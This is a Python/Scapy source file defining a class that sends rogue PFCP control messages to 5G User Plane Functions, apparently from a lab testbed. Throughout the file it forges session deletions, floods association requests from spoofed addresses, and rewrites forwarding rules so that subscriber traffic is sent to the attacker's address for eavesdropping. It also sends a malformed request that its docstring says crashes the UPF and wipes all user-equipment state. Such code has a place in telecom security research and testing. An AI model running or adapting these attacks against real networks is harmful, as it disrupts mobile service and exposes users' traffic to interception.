from scapy.all import sendp, send, sr1,srp1, sniff, Packet, hexdump, Ether, IP, ICMP, UDP , get_if_addr
from scapy.contrib.pfcp import *
import os
import time

#iface="enp0s3"
#iface="lo"
iface="uesimtun0"
iface_ip=get_if_addr(iface)

class PFCP_sender:
    """
    A class that sends rogue PFCP messages to upfs.
    """
    def __init__(self, source_ip="10.0.14.10", destination_ips=["10.0.17.1"], gnb_ip="10.0.2.15"):
        #print ("source ip", source_ip, "destination_ip", destination_ips)
        if source_ip==None:
            self.source_ip=iface_ip
        else:
            self.source_ip=source_ip
        
        if destination_ips==None:
            destination_ips=["10.0.17.1"]

        self.print_packets=2
        self.gnb_ip=gnb_ip
        self.send_to=self.source_ip
        self.associate_wait=2
        self.seq=60
        self.message_type_mapping={54: "Session Delete Request",
                                   5: "Association Request",
                                   52: "Session Modification Request",
                                   "eavesdrop" : "Session Eavesdrop Modification Request",
                                   "eavesdrop2" : "Session Eavesdrop Modification Request",
                                   50: "Session Establishment Request"
                                    }
        if not type(destination_ips)== list:
            self.destination_ips=[destination_ips]
        else:
            self.destination_ips=destination_ips
    
        self.last_associate={}
        for i in self.destination_ips:
                self.last_associate[i]=time.time()-self.associate_wait
    def gen_modification_request(self, destination_ip="10.0.17.1", teid=1):
        """
        """
        #pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=None, IE_list=[IE_FAR_Id(length=None, id=1), IE_ApplyAction(length=None, DROP=1), IE_UpdateForwardingParameters(length=None, IE_list=[IE_DestinationInterface(length=None), IE_OuterHeaderCreation(length=None, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        pkt=IP(bytes(pkt))
        return pkt
        
    def gen_eavesdrop_modification_request(self, destination_ip="10.0.17.1", teid=1):
        """
        """
        #pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=None, IE_list=[IE_FAR_Id(length=None, id=1), IE_ApplyAction(length=None, DUPL=0, FORW=1), IE_UpdateForwardingParameters(length=None, IE_list=[IE_DestinationInterface(length=None), IE_OuterHeaderCreation(length=None, GTPUUDPIPV4=1,TEID=teid, ipv4=self.send_to) ]) ])])
        pkt=IP(bytes(pkt))
        
        return pkt
        
    def gen_eavesdrop_modification_request2(self, destination_ip="10.0.17.1", teid=1):
        """
        """
        #pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=None, IE_list=[IE_FAR_Id(length=None, id=1), IE_ApplyAction(length=None, DUPL=0, FORW=1), IE_UpdateForwardingParameters(length=None, IE_list=[IE_DestinationInterface(length=None), IE_OuterHeaderCreation(length=None, GTPUUDPIPV4=1,TEID=teid-1, ipv4=self.source_ip) ]) ]) ])
        pkt=IP(bytes(pkt))
        
        return pkt
        
    def gen_misconfigured_modification_request(self, destination_ip="10.0.17.1", teid=1):
        """
        This leads to the UPF restarting and losing all UE information
        """
        #pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2,DROP=1), IE_UpdateForwardingParameters(length=30, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        return pkt
        
    def gen_session_setup_request(self, destination_ip="10.0.21.1", teid=7, ue_ip="10.47.0.20"):
        """
        
        """
        #creates another crash for both versions#pkt=IP(version=4, ihl=5, tos=0, flags=2, frag=0, ttl=64, proto=17, src=self.source_ip, dst=destination_ip)/UDP(len=None, chksum=None, sport=8805, dport=8805)/PFCP(version=1, S=1, message_type=50, seid=0, seq=self.seq)/PFCPSessionEstablishmentRequest(IE_list=[IE_NodeId(ietype=60, length=None, id_type=0, ipv4=self.source_ip, extra_data=b''),IE_FSEID(ietype=57, length=None, seid=teid, ipv4=self.source_ip),IE_CreatePDR(IE_list=[IE_PDR_Id(ietype=56, id=1),IE_Precedence(ietype=29, length=None, precedence=255),IE_PDI(IE_list=[IE_SourceInterface(ietype=20, length=None, interface=1, extra_data=b''),IE_NetworkInstance(ietype=22, length=None, instance=b'internet2'),IE_UE_IP_Address(ietype=93, length=None, SD=1, V4=1, V6=0, ipv4=ue_ip)], ietype=2, length=None),IE_FAR_Id(ietype=108, length=None, id=1),IE_URR_Id(ietype=81, length=None, id=1, extra_data=b''),IE_QER_Id(ietype=109, length=None, id=1)], ietype=1, length=None),IE_CreatePDR(IE_list=[IE_PDR_Id(ietype=56, length=None, id=2),IE_Precedence(ietype=29, length=None, precedence=255),IE_PDI(IE_list=[IE_SourceInterface(ietype=20, length=None, spare=0, interface=0, extra_data=b''),IE_FTEID(ietype=21, length=None, CHID=1, CH=1, V6=1, V4=1, choose_id=5, extra_data=b''),IE_NetworkInstance(ietype=22, length=None, instance='internet2'),IE_UE_IP_Address(ietype=93, length=None, spare=0, SD=0, V4=1, V6=0, ipv4=ue_ip),IE_QFI(ietype=124, length=None, QFI=1)], ietype=2, length=None),IE_OuterHeaderRemoval(ietype=95, length=None, header=0, spare=0, pdu_session_container=1),IE_FAR_Id(ietype=108, length=None, id=2),IE_QER_Id(ietype=109, length=None, id=1)], ietype=1, length=None),IE_CreatePDR(IE_list=[IE_PDR_Id(ietype=56, length=None, id=3, extra_data=b''),IE_Precedence(ietype=29, length=None, precedence=1000),IE_PDI(IE_list=[IE_SourceInterface(ietype=20, length=None, spare=0, interface=3, extra_data=b''),IE_FTEID(ietype=21, length=None, CHID=0, CH=1, V6=1, V4=1),IE_NetworkInstance(ietype=22, length=None, instance='internet2')], ietype=2, length=None),IE_OuterHeaderRemoval(ietype=95, length=None, header=0),IE_FAR_Id(ietype=108, length=None, id=1, extra_data=b''),IE_QER_Id(ietype=109, length=None, id=1)], ietype=1, length=62),IE_CreatePDR(IE_list=[IE_PDR_Id(ietype=56, length=None, id=4, extra_data=b''),IE_Precedence(ietype=29, length=None, precedence=1),IE_PDI(IE_list=[IE_SourceInterface(ietype=20, length=None, spare=0, interface=0, extra_data=b''),IE_FTEID(ietype=21, length=None, spare=0, CHID=1, CH=1, V6=1, V4=1, choose_id=5),IE_NetworkInstance(ietype=22, length=None, instance='internet2'),IE_SDF_Filter(ietype=23, length=None, spare=0, BID=0, FL=0, SPI=0, TTC=0, FD=1, spare_oct=0, flow_description_length=42, flow_description=b'permit out 58 from ff02::2/128 to assigned', extra_data=b''),IE_QFI(ietype=124, length=None, spare=0, QFI=1)], ietype=2, length=79),IE_OuterHeaderRemoval(ietype=95, length=None, header=0, extra_data=b''),IE_FAR_Id(ietype=108, length=None, id=3)], ietype=1, length=None),IE_CreateFAR(IE_list=[IE_FAR_Id(ietype=108, length=None, id=1),IE_ApplyAction(ietype=44, length=None, spare=0, DUPL=0, NOCP=1, BUFF=1, FORW=0, DROP=0, extra_data=b'\\x00'),IE_BAR_Id(ietype=88, length=None, id=1)], ietype=3, length=None),IE_CreateFAR(IE_list=[IE_FAR_Id(ietype=108, length=4, id=2, extra_data=b''),IE_ApplyAction(ietype=44, length=2, spare=0, DUPL=0, NOCP=0, BUFF=0, FORW=1, DROP=0, extra_data=b'\\x00'),IE_ForwardingParameters(IE_list=[IE_DestinationInterface(ietype=42, length=1, spare=0, interface=1, extra_data=b''),IE_NetworkInstance(ietype=22, length=9, instance=b'internet')], ietype=4, length=18)], ietype=3, length=36),IE_CreateFAR(IE_list=[IE_FAR_Id(ietype=108, length=4, id=3, extra_data=b''),IE_ApplyAction(ietype=44, length=2, spare=0, DUPL=0, NOCP=0, BUFF=0, FORW=1, DROP=0, extra_data=b'\\x00'),IE_ForwardingParameters(IE_list=[IE_DestinationInterface(ietype=42, length=1, spare=0, interface=3, extra_data=b''),IE_NetworkInstance(ietype=22, length=9, instance=b'internet'),IE_OuterHeaderCreation(ietype=84, length=10, STAG=0, CTAG=0, IPV6=0, IPV4=0, UDPIPV6=0, UDPIPV4=0, GTPUUDPIPV6=0, GTPUUDPIPV4=1, spare=0, TEID=teid, ipv4=self.source_ip)], ietype=4, length=32)], ietype=3, length=50),IE_CreateURR(IE_list=[IE_URR_Id(ietype=81, length=4, id=1, extra_data=b''),IE_MeasurementMethod(ietype=62, length=1, spare=0, EVENT=0, VOLUM=1, DURAT=0, extra_data=b''),IE_ReportingTriggers(ietype=37, length=3, linked_usage_reporting=0, dropped_dl_traffic_threshold=0, stop_of_traffic=0, start_of_traffic=0, quota_holding_time=0, time_threshold=0, volume_threshold=1, periodic_reporting=0, spare=0, event_quota=0, event_threshold=0, mac_addresses_reporting=0, envelope_closure=0, time_quota=0, volume_quota=0, extra_data=b'\\x00'),IE_VolumeThreshold(ietype=31, length=9, spare=0, DLVOL=0, ULVOL=0, TOVOL=1, total=104857600)], ietype=6, length=33),IE_CreateQER(IE_list=[IE_QER_Id(ietype=109, length=4, id=1, extra_data=b''),IE_GateStatus(ietype=25, length=1, spare=0, ul=0, dl=0, extra_data=b''),IE_MBR(ietype=26, length=10, ul=1073741, dl=1073741, extra_data=b''),IE_QFI(ietype=124, length=1, spare=0, QFI=1)], ietype=7, length=32),IE_Create_BAR(IE_list=[IE_BAR_Id(ietype=88, length=1, id=1)], ietype=85, length=5),IE_PDNType(ietype=113, length=1, spare=0, pdn_type=1)])
        pkt=IP(version=4, ihl=5, tos=0, flags=2, frag=0, ttl=64, proto=17, src=self.source_ip, dst=destination_ip)/UDP(len=None, chksum=None, sport=8805, dport=8805)/PFCP(version=1, S=1, message_type=50, seid=teid, seq=self.seq)/PFCPSessionEstablishmentRequest()
        pkt=IP(bytes(pkt))
        return pkt
        
    def gen_packet(self,t=54,destination_ip=None, seid=1, source_ip=None):
        """
        54 deletion, 5 associate request, Heartbeat
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]
        if source_ip==None:
            source_ip=self.source_ip
        if t==52:
            pkt=self.gen_modification_request(destination_ip=destination_ip, teid=seid)
        elif t=="eavesdrop":
            pkt=self.gen_eavesdrop_modification_request(destination_ip=destination_ip, teid=seid)
        elif t==50:
            pkt=self.gen_session_setup_request(destination_ip=destination_ip, teid=seid)
        elif t=="eavesdrop2":
            pkt=self.gen_eavesdrop_modification_request2(destination_ip=destination_ip, teid=seid)
        else:
            #pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
            pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
        
        #pkt= Ether(bytes(pkt))
        if self.print_packets==2:
            pkt.show()
        
        self.seq+=1
        return pkt

    def send_packet(self, t, destination_ip, seid=1, source_ip=None):
        """
        """
        if source_ip==None:
            source_ip=self.source_ip
        if destination_ip==None:
            destination_ip=self.destination_ips[0]
        p= self.gen_packet(t=t, destination_ip=destination_ip, seid=seid, source_ip=source_ip)
        sendp(p, iface=iface)
        #p.show()
        to_print="Sending " +str(self.message_type_mapping[t]) 
        if t==5: 
            to_print+= " with SEID: " +str(seid)
        to_print+=" to UPF at: "
        to_print+= destination_ip
        if self.print_packets>=1:
            print(to_print)
    def associate_request(self, destination_ips=None, source_ip=None, overwrite_wait=False):
        """
        In order to send requests we need to associate to the upfs first.
        """
        if source_ip==None:
            source_ip=self.source_ip
        if destination_ips==None:
            destination_ips=self.destination_ips
        for ip in destination_ips:
                if not overwrite_wait:
                        if time.time()-self.last_associate[ip]<=self.associate_wait:
                                continue
                        else:
                                self.last_associate[ip]=time.time()
                self.send_packet(t=5, destination_ip=ip, source_ip=source_ip) 
                
    def flood_request(self, t, seid_range=(0,10), send_to_ip=None):
       """
       """
       for seid in range(seid_range[0], seid_range[1]):
           if seid%4==0:
               self.associate_request()#associate to upf, we will not be bothering with hearbeats so we have to reassociate every couple requests
           for ip in self.destination_ips:
               self.send_packet(t=t, destination_ip=ip, seid=seid)
                 
    
    def targeted_request(self, t, seid, destination_ip=None):
        """
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]         
        self.associate_request(destination_ips=[destination_ip])
        self.send_packet(t=t, destination_ip=destination_ip, seid=seid)
        
    
    def targeted_session_delete_request(self,seid=1, destination_ip=None):
        """
        Delete a specific session on a upf
        """
        self.targeted_request(t=54, seid=seid, destination_ip=destination_ip)
        

    def flood_session_delete_requests(self, seid_range=(0,10)):
        """
        Flood sesseion delete packets in a seid_range.
        """
        self.flood_request(t=54, seid_range=seid_range)
        
    def targeted_session_modification_request(self,seid=1, destination_ip=None):
        """
        
        """
        self.targeted_request(t=52, seid=seid, destination_ip=destination_ip)
        
    def targeted_session_establishment_request(self,seid=1, destination_ip=None):
        """
        
        """
        self.targeted_request(t=50, seid=seid, destination_ip=destination_ip)
        

    def flood_session_eavesdrop_modification_requests(self, seid_range=(0,10), destination_ip=None):
        """
        Flood sesseion delete packets in a seid_range.
        """
        self.flood_request(t="eavesdrop2", seid_range=seid_range, destination_ip=destination_ip)
        
    def targeted_session_eavesdrop_modification_request(self,seid=1, destination_ip=None):
        """
        Delete a specific session on a upf
        """
        self.targeted_request(t="eavesdrop", seid=seid, destination_ip=destination_ip)
        #self.send_packet(t="eavesdrop2", seid=seid, destination_ip=destination_ip)
        

    def flood_session_modification_requests(self, seid_range=(0,10)):
        """
        Flood sesseion delete packets in a seid_range.
        """
        self.flood_request(t=52, seid_range=seid_range)
        
    def flood_associate_requests(self, source_ip_range=(0,255)):
        """
        flood associate requests to targets. 
        """
        print("Will flood targets ",  self.destination_ips, " with association requests.")
        i=source_ip_range[0]
        while True:
            try:
               self.associate_request(source_ip="10."+str(i)+".0.1", overwrite_wait=True)
               #self.associate_request(source_ip="10.0."+str(i)+".1")
               if i==source_ip_range[1]:
                  i=source_ip_range[0]
               else:
                   i+=1
            except KeyboardInterrupt:
                print("Ending Flood.")
                break
                
                
    def malformed_modifcation_request(self):
        """
        Leads to the upf restarting.
        """
        for ip in self.destination_ips:
            p=self.gen_misconfigured_modification_request(destination_ip=ip)
            p.show()
            sendp(p, iface=iface)
        
                
           
                        




